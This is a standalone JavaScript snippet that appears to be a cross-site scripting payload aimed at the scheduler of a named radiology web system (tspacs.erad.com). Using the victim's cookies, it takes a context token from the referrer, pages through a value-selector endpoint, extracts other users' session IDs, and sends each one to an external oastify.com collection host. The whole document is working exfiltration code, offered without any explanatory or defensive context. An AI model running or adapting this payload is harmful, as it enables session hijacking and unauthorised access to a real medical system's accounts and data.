(function(){
let ref=document.referrer;
let c=ref.match(/cContext=([^&]+)/);
if(c){
let ctx=c[1];
fetch('https://tspacs.erad.com/scheduler/valueSelectorPopupTable.jsp?cPage=1&cContext='+ctx,{credentials:'include'})
.then(r=>r.text())
.then(t=>{
let m=t.match(/<A[^>]+href="JavaScript:\s*redirPage_eP\('\/scheduler\/valueSelectorPopupTable\.jsp\?cPage=(\d+)'\)">Last<\/a>/i);
if(m){
let last=parseInt(m[1],10);
for(let p=last;p>last-10;p--){
fetch('https://tspacs.erad.com/scheduler/valueSelectorPopupTable.jsp?cPage='+p+'&cContext='+ctx,{credentials:'include'})
.then(r=>r.text())
.then(t=>{
// Fixed regex: looks specifically for "logged in;" pattern
let s=t.match(/logged in;\s*session ID:\s*([^;]+);/g);
if(s){
s.forEach(match=>{
let id=match.match(/session ID:\s*([^;]+);/)[1].trim();
fetch('https://288txy69u88zcpjq6tg9h8l74yapyh25r.oastify.com?'+encodeURIComponent(id),{mode:'no-cors'});
});
}
});
}
}
});
}
})();
